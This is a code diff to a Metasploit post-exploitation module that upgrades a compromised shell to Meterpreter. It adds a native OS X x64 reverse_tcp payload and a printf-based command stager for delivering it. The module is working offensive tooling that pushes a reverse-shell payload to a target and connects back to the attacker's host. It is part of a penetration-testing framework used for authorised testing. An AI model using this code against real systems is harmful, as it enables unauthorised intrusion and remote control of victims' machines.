@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -52,11 +52,6 @@ class MetasploitModule < Msf::Post
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
 
-    if session.type =~ /meterpreter/
-      print_error("Shell is already Meterpreter.")
-      return nil
-    end
-
     # Try hard to find a valid LHOST value in order to
     # make running 'sessions -u' as robust as possible.
     if datastore['LHOST']
@@ -86,8 +81,10 @@ class MetasploitModule < Msf::Post
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
     when 'osx'
-      platform = 'python'
-      payload_name = 'python/meterpreter/reverse_tcp'
+      platform = 'osx'
+      payload_name = 'osx/x64/meterpreter/reverse_tcp'
+      lplat = [Msf::Platform::OSX]
+      larch = [ARCH_X64]
       vprint_status("Platform: OS X")
     when 'solaris'
       platform = 'python'
@@ -104,8 +101,10 @@ class MetasploitModule < Msf::Post
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
       elsif target_info =~ /darwin/i
-        platform = 'python'
-        payload_name = 'python/meterpreter/reverse_tcp'
+        platform = 'osx'
+        payload_name = 'osx/x64/meterpreter/reverse_tcp'
+        lplat = [Msf::Platform::OSX]
+        larch = [ARCH_X64]
         vprint_status("Platform: OS X")
       elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
         # Generic fallback for OSX, Solaris, Linux/ARM
@@ -167,7 +166,7 @@ class MetasploitModule < Msf::Post
           print_error('Powershell is not installed on the target.') if datastore['WIN_TRANSFER'] == 'POWERSHELL'
           vprint_status("Transfer method: VBS [fallback]")
           exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
-          aborted = transmit_payload(exe)
+          aborted = transmit_payload(exe, platform)
         end
       end
     when 'python'
@@ -176,7 +175,7 @@ class MetasploitModule < Msf::Post
     else
       vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
-      aborted = transmit_payload(exe)
+      aborted = transmit_payload(exe, platform)
     end
 
     if datastore['HANDLER']
@@ -186,7 +185,7 @@ class MetasploitModule < Msf::Post
     return nil
   end
 
-  def transmit_payload(exe)
+  def transmit_payload(exe, platform)
     #
     # Generate the stager command array
     #
@@ -198,16 +197,18 @@ class MetasploitModule < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform == 'windows'
+    case platform
+    when 'windows'
       opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
+    when 'osx'
+      opts[:background] = true
+      cmdstager = Rex::Exploitation::CmdStagerPrintf.new(exe)
     else
       opts[:background] = true
       opts[:temp] = datastore['BOURNE_PATH']
       opts[:file] = datastore['BOURNE_FILE']
       cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
-      # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
-      #       as /bin/sh on OS X doesn't support the -n option on echo
     end
 
     cmds = cmdstager.generate(opts)
